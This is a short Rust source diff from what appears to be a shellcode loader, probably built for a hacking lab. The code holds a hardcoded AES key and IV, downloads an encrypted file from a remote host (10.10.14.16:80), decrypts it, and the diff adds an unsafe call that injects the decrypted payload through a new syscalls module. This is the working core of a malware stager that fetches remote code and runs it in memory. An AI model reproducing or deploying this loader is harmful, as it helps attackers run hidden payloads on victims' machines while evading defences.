@@ -1,3 +1,5 @@
+mod syscalls;
+
 use aes::{
     Aes256,
     cipher::{BlockModeDecrypt, BlockModeEncrypt, KeyIvInit, block_padding::Pkcs7},
@@ -15,6 +17,7 @@ const IV_HEX: &str = "34421aedd8bc5caec8a9075aa67bf9aa";
 
 const REMOTE_IP: &str = "10.10.14.16";
 const REMOTE_PORT: &str = "80";
+
 const FILE_PATH: &str = "s";
 
 fn main() {
@@ -55,6 +58,7 @@ fn main() {
     let key = decode_hex::<32>(KEY_HEX);
     let encrypted_data = download_file(&remote_ip, &remote_port, FILE_PATH).unwrap();
     let data = decrypt_data(&key, encrypted_data);
+    unsafe { syscalls::inject(&data); }
 }
 
 fn wait(duration: Duration) {
